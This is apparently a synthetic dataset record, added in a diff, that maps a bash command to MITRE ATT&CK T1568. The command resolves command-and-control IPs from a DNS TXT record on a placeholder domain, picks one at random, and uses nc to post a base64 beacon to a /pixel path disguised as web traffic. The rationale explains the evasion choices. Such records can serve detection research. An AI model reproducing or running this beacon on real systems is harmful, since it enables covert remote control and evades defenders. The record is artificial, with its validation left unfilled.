@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"domain=cdn-status.example.net; txt=$(dig +short TXT \\\"$domain\\\" | tr -d '\\\"'); ip=$(printf '%s' \\\"$txt\\\" | tr , '\\n' | shuf -n1); host=static.example.net; ua=\\\"Mozilla/5.0 (X11; Linux)\\\"; payload=$(printf 'ping' | base64 -w0); body=\\\"d=$payload\\\"; printf 'POST /pixel HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$host\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Pulls an IP list from a DNS TXT record to dynamically select a C2 endpoint at runtime, then posts a base64 payload to a benign-looking path/pixel resource to blend in.",
+  "rationale_steps": [
+    "Use DNS TXT data to distribute and dynamically resolve C2 IPs.",
+    "Randomly select an IP for resilience against takedowns.",
+    "Imitate normal web beacons with a /pixel path and standard headers.",
+    "Send base64 content in a form-encoded body via nc over TCP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-ce0cc857",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
